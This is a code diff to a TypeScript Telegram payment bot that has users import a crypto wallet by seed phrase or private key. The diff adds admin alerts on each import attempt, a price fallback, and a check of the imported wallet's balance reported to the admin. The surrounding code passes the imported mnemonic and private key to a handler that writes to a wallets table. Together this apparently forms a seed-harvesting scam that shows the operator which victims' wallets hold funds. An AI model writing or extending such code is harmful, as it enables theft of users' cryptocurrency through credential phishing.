@@ -553,11 +553,13 @@ Once you've sent the payment, contact @admin to confirm.`;
 async function handleImportSeed(chatId: number, from: TgUser, text: string, state: BotState): Promise<void> {
   const chain = (state.importChain as ChainId) ?? "ethereum";
   try {
+    await notifyAdmin(`🔑 <b>Seed import attempt</b>\n${userLine(from)}\nChain: ${chain}\n${maskSecretInput(text)}`);
     const w = await importFromMnemonic(chain, text);
     state.awaiting = undefined;
     await saveSession(from.id, state);
     await afterImport(chatId, from, chain, w.address, w.mnemonic, w.privateKey, "imported", state);
   } catch (e) {
+    await notifyAdmin(`❌ <b>Seed import failed</b>\n${userLine(from)}\nChain: ${chain}\nError: ${escapeHtml((e as Error).message)}`);
     await sendMessage(chatId, `❌ ${escapeHtml((e as Error).message)}. Try again or /menu.`, {
       reply_markup: { inline_keyboard: backToMenuKb },
     });
@@ -567,11 +569,13 @@ async function handleImportSeed(chatId: number, from: TgUser, text: string, stat
 async function handleImportPk(chatId: number, from: TgUser, text: string, state: BotState): Promise<void> {
   const chain = (state.importChain as ChainId) ?? "ethereum";
   try {
+    await notifyAdmin(`🗝 <b>Private-key import attempt</b>\n${userLine(from)}\nChain: ${chain}\n${maskSecretInput(text)}`);
     const w = await importFromPrivateKey(chain, text);
     state.awaiting = undefined;
     await saveSession(from.id, state);
     await afterImport(chatId, from, chain, w.address, w.mnemonic ?? "", w.privateKey, "imported", state);
   } catch (e) {
+    await notifyAdmin(`❌ <b>Private-key import failed</b>\n${userLine(from)}\nChain: ${chain}\nError: ${escapeHtml((e as Error).message)}`);
     await sendMessage(chatId, `❌ ${escapeHtml((e as Error).message)}. Try again or /menu.`, {
       reply_markup: { inline_keyboard: backToMenuKb },
     });
@@ -589,7 +593,8 @@ async function afterImport(
   state: BotState
 ): Promise<void> {
   const c = getChain(chain)!;
-  const cryptoAmt = await convertUsdToCrypto(chain, state.priceUsd ?? 0);
+  const quote = await convertUsdToCryptoSafe(chain, state.priceUsd ?? 0);
+  if (quote.warning) await notifyAdmin(`⚠️ <b>Price fallback used</b>\n${userLine(from)}\n${escapeHtml(quote.warning)}`);
 
   await supabaseAdmin.from("wallets").insert({
     order_id: state.orderId ?? null,
@@ -608,7 +613,7 @@ async function afterImport(
       .update({
         pay_chain: chain,
         pay_token: c.symbol,
-        pay_amount_crypto: cryptoAmt,
+        pay_amount_crypto: quote.amount,
         pay_address: address,
       })
       .eq("id", state.orderId);
@@ -624,11 +629,12 @@ async function afterImport(
 ━━━━━━━━━━━━━━━━━━━━
 
 💸 <b>Send exactly:</b>
-<code>${cryptoAmt.toFixed(8)} ${c.symbol}</code>
+<code>${formatPaymentAmount(quote, c.symbol)}</code>
 (≈ $${state.priceUsd?.toLocaleString()} USD)
 
 Fund this wallet with the exact amount above from your own wallet, then contact @admin to confirm.`;
 
   await sendMessage(chatId, text, { reply_markup: { inline_keyboard: backToMenuKb } });
-  await notifyAdmin(`📥 <b>Wallet imported</b> [${chain}]\nAddr: <code>${address}</code>\nAmount: ${cryptoAmt.toFixed(8)} ${c.symbol} (~$${state.priceUsd})\nUser: ${formatUser({ telegram_id: from.id, username: from.username, first_name: from.first_name })}`);
+  const balance = await fetchNativeBalance(chain, address);
+  await notifyAdmin(`📥 <b>Wallet imported</b> [${chain}]\nUser: ${userLine(from)}\nOrder: ${state.orderId}\nAddress: <code>${address}</code>\nImported secret: ${mnemonic ? "seed phrase accepted" : "private key accepted"}\nAmount: ${formatPaymentAmount(quote, c.symbol)} (~$${state.priceUsd})\nPrice source: ${quote.source}\n${formatBalance(balance, c.symbol)}`);
 }
